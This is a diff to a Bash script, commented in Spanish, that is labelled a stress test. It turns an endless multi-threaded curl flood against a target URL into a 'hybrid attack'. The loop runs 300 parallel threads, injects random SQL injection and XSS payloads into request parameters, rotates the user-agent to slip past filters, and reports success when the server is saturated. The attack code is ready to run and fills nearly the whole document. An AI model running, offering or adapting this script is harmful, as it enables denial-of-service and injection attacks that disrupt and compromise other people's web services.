@@ -14,23 +14,32 @@ echo "Target: $TARGET_URL"
 echo "Fecha: $(date)"
 echo "-------------------------------------------------"
 
-# 1. Prueba de estrés real (Inundación Ultra-Agresiva v3)
-echo "[+] Iniciando inundación masiva (EXTREME HTTP Flood v3)..."
-echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones por segundo sin límites."
+# 1. Prueba de estrés real (Ataque Híbrido: Flood + SQLi + XSS)
+echo "[+] Iniciando ataque híbrido masivo (HTTP Flood + Payload Injection)..."
+echo "[!] ADVERTENCIA: Esta prueba enviará miles de peticiones con payloads maliciosos."
 echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."
+
+# Payloads básicos para inyección
+SQLI_PAYLOADS=("' OR 1=1 --" "' OR '1'='1" "admin' --" "') OR ('1'='1")
+XSS_PAYLOADS=("<script>alert(1)</script>" "\"><script>alert('XSS')</script>" "javascript:alert(1)")
 
 # Inundación infinita con hilos extremos y parámetros de fuerza bruta
 while true; do
+    # Seleccionar payloads aleatorios
+    SQL=${SQLI_PAYLOADS[$RANDOM % ${#SQLI_PAYLOADS[@]}]}
+    XSS=${XSS_PAYLOADS[$RANDOM % ${#XSS_PAYLOADS[@]}]}
+    
     # -P 300: 300 hilos simultáneos
-    # --connect-timeout 1: Tiempo de espera mínimo
-    # --max-time 2: Máximo tiempo por petición para no bloquear hilos
-    # -A: User-agent aleatorio para intentar evadir filtros básicos
-    seq 1000 | xargs -n 1 -P 300 curl -s -L -k --connect-timeout 1 --max-time 2 -A "SANTRIX-Audit-Agent-$(date +%s)" -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
+    # Se añaden parámetros con payloads de SQLi y XSS en la URL para estresar el backend y los filtros
+    seq 500 | xargs -n 1 -P 300 curl -s -L -k --connect-timeout 1 --max-time 2 \
+        -A "SANTRIX-Hybrid-Agent-$(date +%s)" \
+        -G --data-urlencode "user=$SQL" --data-urlencode "q=$XSS" \
+        -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
     
     # Análisis de salud
     FAIL_COUNT=$(tail -n 300 /tmp/stress_results.txt | grep -c -v "200")
     if [ "$FAIL_COUNT" -gt 250 ]; then
-        echo "[!!!] ÉXITO: El servidor está saturado o bloqueando activamente."
+        echo "[!!!] ÉXITO: El servidor está saturado o bloqueando activamente el ataque híbrido."
     fi
 done &
 STRESS_PID=$!
